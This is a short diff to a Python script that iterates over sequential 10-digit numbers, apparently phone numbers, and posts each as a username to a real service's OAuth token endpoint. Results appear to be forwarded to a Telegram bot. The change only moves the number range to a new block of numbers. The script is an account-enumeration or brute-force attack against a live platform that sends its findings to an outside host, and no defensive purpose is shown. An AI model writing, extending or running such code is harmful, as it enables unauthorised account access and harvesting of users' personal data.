@@ -18,7 +18,7 @@ async def get_batches_and_send_message(number):
         'longitude': 0,
     }
     
-    while number != 8000000000:
+    while number != 9000000000:
         json_data['username'] = str(number)
         response = requests.post('https://api.penpencil.co/v3/oauth/token', headers=headers, json=json_data)
         
@@ -57,4 +57,4 @@ def send_telegram_message(message):
     requests.get(telegram_url)
 
 loop = asyncio.get_event_loop()
-loop.run_until_complete(get_batches_and_send_message(8482997393))
+loop.run_until_complete(get_batches_and_send_message(9471997393))
